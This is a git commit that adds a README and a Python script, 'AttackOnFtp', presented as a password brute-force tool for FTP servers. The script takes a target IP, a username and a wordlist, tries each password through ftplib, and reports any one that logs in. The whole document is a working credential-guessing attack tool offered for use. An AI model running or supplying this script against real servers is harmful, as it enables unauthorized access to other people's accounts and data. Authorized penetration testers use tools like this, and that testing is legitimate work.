8e69c222fd2bebae25acf51a814859a35a374d0b
Miguel Galdino <85813276+Miguel-Galdin0@users.noreply.github.com>
2022-03-12 08:03:34 -0300

    Add files via upload

---
+++ README.md
@@ -0,0 +1,41 @@
+<h1 align="center">
+<img src="/images/logo.png" alt="AttackOnFtp" width="700px"></a>
+</h1>
+
+<h4 align="center">
+AttackOnFtp is a password brute force tool for ftp made with python!
+</h4>
+
+<p align="center">
+  • <a href="#installation">Installation</a>
+  • <a href="#usage">Usage</a>
+  • <a href="#commands">Commands</a>
+</p>
+
+---
+
+# Installation
+
+Run this to install:
+ 
+```sh
+$ git clone https://github.com/Miguel-Galdin0/AttackOnFtp.git
+```
+
+# Usage
+ 
+```sh
+$ python3 attackonftp.py (IP) -u (user) -w (wordlist) [opitional commands]
+```
+Exemple:
+
+<img src="/images/exemple.png" alt="openPortScanner" width="700px"></a>
+
+
+# Commands
+
+Use this if you need help with commands:
+
+```sh
+$ python3 attackonftp.py -h
+```
---
+++ attackonftp.py
@@ -0,0 +1,93 @@
+import argparse
+import socket
+import ftplib
+import sys
+from datetime import datetime
+
+version = 1.0
+
+def banner():
+    print(f"""
+\033[31m    |       .     .                   '||     \033[m  ..|''||            \033[32m'||''''|   .            \033[m
+\033[31m   |||    .||.  .||.   ....     ....   ||  .. \033[m .|'    ||  .. ...   \033[32m ||  .   .||.  ... ...  \033[m
+\033[31m  |  ||    ||    ||   '' .||  .|   ''  || .'  \033[m ||      ||  ||  ||  \033[32m ||''|    ||    ||'  || \033[m
+\033[31m .''''|.   ||    ||   .|' ||  ||       ||'|.  \033[m '|.     ||  ||  ||  \033[32m ||       ||    ||    | \033[m
+\033[31m.|.  .||.  '|.'  '|.' '|..'|'  '|...' .||. ||.\033[m  ''|...|'  .||. ||. \033[32m.||.      '|.'  ||...'  
+                                                                                   ||\033[m V {version}
+                         create by ~ github.com/Miguel-Galdin0                    \033[32m''''\033[m
+""")
+
+banner()
+
+#Arguments
+parser = argparse.ArgumentParser(description="AttackOnFtp is a password brute force tool for ftp made with python!")
+parser.add_argument("ip", help="IP to make brute force.")
+parser.add_argument("-u","--user","--username", help="The user of ftp service.", required=True)
+parser.add_argument("-w","--wordlist", help="The document used to try passwords.", required=True)
+parser.add_argument("-p","--port", help="Make brute force in specific port. Default port is 21.")
+args = parser.parse_args()
+
+ip = args.ip
+user = args.user
+pass_found = False
+
+if args.port:
+    port = args.port
+    port = int(port)
+else:
+    port = 21
+
+#DATA TIME
+print('-' * 50)
+print('|[*] Brute force Target: ' + ip)
+print('|[*] Brute force started at: ' + str(datetime.now()))
+print('-' * 50)
+
+#OPEN WORLIST
+try:
+    file = open(args.wordlist, "r")
+except (FileNotFoundError, OSError):
+    print("\n\033[31m[-]\033[m File not found!")
+    sys.exit()
+
+for line in file.readlines():
+        line = line.strip()
+        print(f'\n\033[33m[!]\033[m Testing user "{user}" with password "{line}".')
+        try:
+            ftp = ftplib.FTP(ip)
+            ftp.connect(host=ip, port=port)
+            ftp.login(user=user,passwd=line)
+            print("\n\033[32m[+]\033[m------>>>Password found!<<<------")
+            pass_found = True
+            print(f'\033[32m[+]\033[m Password is: {line}')
+            ftp.quit() 
+            break
+
+        except socket.gaierror:
+            print(f'\n\033[31m[-]\033[m Failed to connect in: {ip}')
+            print("\033[31m[-]\033[m The IP seems down or doesn't exist.")
+            sys.exit()
+
+        except socket.error:
+            print(f'\n\033[31m[-]\033[m Failed to connect in: {ip}')
+            print('\n\033[31m[-]\033[m Server is not responding!')
+            sys.exit()
+
+        except ftplib.error_perm:
+            print(f'\033[31m[-]\033[m Invalid password!')
+            pass
+
+        except ConnectionRefusedError:
+            print(f'\n\033[31m[-]\033[m Server is not responding!')
+            sys.exit()
+
+        except EOFError:
+            print(f'\n\033[31m[-]\033[m Server stop stopped responding!')
+            sys.exit()
+
+        except KeyboardInterrupt:
+            print('\n\033[31m[-]\033[m Exiting program!')
+            sys.exit()
+
+if pass_found != True:
+            print(f'\n\033[31m[-]\033[m Password not found for user {user}!')
